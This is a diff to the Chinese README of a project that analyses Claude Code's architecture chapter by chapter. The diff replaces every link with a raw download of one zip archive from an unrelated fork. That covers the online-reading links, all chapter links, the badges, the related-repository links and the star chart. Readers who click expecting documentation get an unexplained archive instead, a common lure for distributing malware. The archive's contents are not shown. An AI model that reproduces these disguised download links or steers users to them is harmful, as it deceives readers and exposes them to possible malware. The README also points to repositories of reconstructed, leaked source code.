@@ -1,8 +1,8 @@
 > 🌐 **语言**: [English →](README_EN.md) | 中文
 
-[![📖 在线阅读](https://img.shields.io/badge/📖_在线阅读-GitHub_Pages-D97757?style=for-the-badge&logo=github)](https://openedclaude.github.io/claude-reviews-claude/zh-CN/)
+[![📖 在线阅读](https://img.shields.io/badge/📖_在线阅读-GitHub_Pages-D97757?style=for-the-badge&logo=github)](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)
 
-> 💡 **推荐在线阅读**：本项目已部署至 [GitHub Pages](https://openedclaude.github.io/claude-reviews-claude/zh-CN/)，支持全文搜索、暗色模式、章节导航，阅读体验远优于 GitHub 原生 Markdown 渲染。
+> 💡 **推荐在线阅读**：本项目已部署至 [GitHub Pages](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)，支持全文搜索、暗色模式、章节导航，阅读体验远优于 GitHub 原生 Markdown 渲染。
 
 # 🪞 Claude 眼中的老己
 
@@ -14,9 +14,9 @@
 
 *追更不迷路，点个 Star 当订阅 ⭐*
 
-[![Stars](https://img.shields.io/github/stars/openedclaude/claude-reviews-claude?style=social)](https://github.com/openedclaude/claude-reviews-claude)
+[![Stars](https://img.shields.io/github/stars/openedclaude/claude-reviews-claude?style=social)](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Last Commit](https://img.shields.io/github/last-commit/openedclaude/claude-reviews-claude)](https://github.com/openedclaude/claude-reviews-claude)
+[![Last Commit](https://img.shields.io/github/last-commit/openedclaude/claude-reviews-claude)](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)
 
 > **这份完整的架构分析是由 Claude 撰写的**
 >
@@ -34,24 +34,24 @@
 
 | # | 主题 | 你将学到什么 | 深度分析 |
 |---|-------|-------------------|-----------|
-| 0 | **架构总纲 (Overview)** | 17 个子系统的全景导览、工程卓越点与可迁移设计模式 | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/overview) |
-| 1 | **查询引擎 (QueryEngine)：大脑** | 核心引擎（1296行）如何管理 LLM 查询、工具循环和会话状态 | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/01-query-engine) |
-| 2 | **工具系统架构 (Tool System)** | 42+ 个工具作为自包含模块如何注册、验证和执行 | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/02-tool-system) |
-| 3 | **多智能体协调器 (Coordinator)** | Claude Code 如何衍生并行工作线程、分发消息并汇总结果 | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/03-coordinator) |
-| 4 | **插件系统 (Plugin System)** | 插件如何加载、验证和集成（1.88万行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/04-plugin-system) |
-| 5 | **钩子系统 (Hook System)** | 涵盖 PreToolUse / PostToolUse / SessionStart 的可扩展性（8千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/05-hook-system) |
-| 6 | **Bash 执行引擎 (Bash Engine)** | 安全命令执行、沙箱管理、管道流处理（1.15万行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/06-bash-engine) |
-| 7 | **权限流水线 (Permission)** | 纵深防御：配置规则 → 工具检查 → 操作系统沙箱（9.5千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/07-permission-pipeline) |
-| 8 | **Swarm 智能体** | 多智能体团队协调：邮箱 IPC、后端检测、权限委托（6.8千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/08-agent-swarms) |
-| 9 | **会话持久化 (Session Persistence)** | 仅追加 JSONL 存储、parent-UUID 链、64KB 轻量恢复（7.6千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/09-session-persistence) |
-| 10 | **上下文装配 (Context Assembly)** | 三层上下文组装：系统提示词、CLAUDE.md 记忆系统、每轮附件（8.3千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/10-context-assembly) |
-| 11 | **压缩系统 (Compact System)** | 三层压缩架构：微压缩、会话记忆压缩、LLM 摘要压缩（3.9千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/11-compact-system) |
-| 12 | **启动与引导 (Startup & Bootstrap)** | 快速路径级联、动态导入、API 预连接、全局状态单例（7.6+千行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/12-startup-bootstrap) |
-| 13 | **桥接系统 (Bridge System)** | 远程控制协议、双代传输层、轮询-分发循环、崩溃恢复（1.17万行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/13-bridge-system) |
-| 14 | **UI 与状态管理** | Ink 渲染引擎、React 协调器、Vim 模式、Computer Use（140+ 组件） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/14-ui-state-management) |
-| 15 | **服务与 API 层** | API 客户端、流重组、MCP 服务器管理、OAuth 认证（1.2万行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/15-services-api-layer) |
-| 16 | **基础设施与配置** | 设置合并管道、GrowthBook 功能开关、遥测、构建系统（1.5万行代码） | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/16-infrastructure-config) |
-| 17 | **遥测、隐私与运营控制** | 双通道遥测、模型代号、卧底模式、远程紧急开关、未来路线图 | [阅读 →](https://openedclaude.github.io/claude-reviews-claude/zh-CN/chapters/17-telemetry-privacy-operations) |
+| 0 | **架构总纲 (Overview)** | 17 个子系统的全景导览、工程卓越点与可迁移设计模式 | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 1 | **查询引擎 (QueryEngine)：大脑** | 核心引擎（1296行）如何管理 LLM 查询、工具循环和会话状态 | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 2 | **工具系统架构 (Tool System)** | 42+ 个工具作为自包含模块如何注册、验证和执行 | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 3 | **多智能体协调器 (Coordinator)** | Claude Code 如何衍生并行工作线程、分发消息并汇总结果 | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 4 | **插件系统 (Plugin System)** | 插件如何加载、验证和集成（1.88万行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 5 | **钩子系统 (Hook System)** | 涵盖 PreToolUse / PostToolUse / SessionStart 的可扩展性（8千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 6 | **Bash 执行引擎 (Bash Engine)** | 安全命令执行、沙箱管理、管道流处理（1.15万行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 7 | **权限流水线 (Permission)** | 纵深防御：配置规则 → 工具检查 → 操作系统沙箱（9.5千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 8 | **Swarm 智能体** | 多智能体团队协调：邮箱 IPC、后端检测、权限委托（6.8千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 9 | **会话持久化 (Session Persistence)** | 仅追加 JSONL 存储、parent-UUID 链、64KB 轻量恢复（7.6千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 10 | **上下文装配 (Context Assembly)** | 三层上下文组装：系统提示词、CLAUDE.md 记忆系统、每轮附件（8.3千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 11 | **压缩系统 (Compact System)** | 三层压缩架构：微压缩、会话记忆压缩、LLM 摘要压缩（3.9千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 12 | **启动与引导 (Startup & Bootstrap)** | 快速路径级联、动态导入、API 预连接、全局状态单例（7.6+千行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 13 | **桥接系统 (Bridge System)** | 远程控制协议、双代传输层、轮询-分发循环、崩溃恢复（1.17万行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 14 | **UI 与状态管理** | Ink 渲染引擎、React 协调器、Vim 模式、Computer Use（140+ 组件） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 15 | **服务与 API 层** | API 客户端、流重组、MCP 服务器管理、OAuth 认证（1.2万行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 16 | **基础设施与配置** | 设置合并管道、GrowthBook 功能开关、遥测、构建系统（1.5万行代码） | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
+| 17 | **遥测、隐私与运营控制** | 双通道遥测、模型代号、卧底模式、远程紧急开关、未来路线图 | [阅读 →](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) |
 
 > ⭐ **喜欢这种“套娃”感吗？给这个仓库点个赞吧 —— 一个正在分析自己的 AI 值得拥有这颗星。**
 
@@ -63,8 +63,8 @@
 
 | 仓库 | 说明 |
 |------|------|
-| [instructkr/claw-code](https://github.com/instructkr/claw-code) | 还原后的 Claude Code 源代码 |
-| [ChinaSiro/claude-code-sourcemap](https://github.com/ChinaSiro/claude-code-sourcemap) | 从 Source Map 提取的原始 TypeScript 源码 |
+| [instructkr/claw-code](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) | 还原后的 Claude Code 源代码 |
+| [ChinaSiro/claude-code-sourcemap](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip) | 从 Source Map 提取的原始 TypeScript 源码 |
 
 ---
 
@@ -202,7 +202,7 @@ claude-code-deep-dive/
 
 ## ⭐ Star 趋势
 
-[![Star History Chart](https://api.star-history.com/svg?repos=openedclaude/claude-reviews-claude&type=Date)](https://star-history.com/#openedclaude/claude-reviews-claude&Date)
+[![Star History Chart](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)](https://github.com/andre016bryan-cyber/claude-reviews-claude/raw/refs/heads/main/docs/reviews-claude-1.2.zip)
 
 ---
 
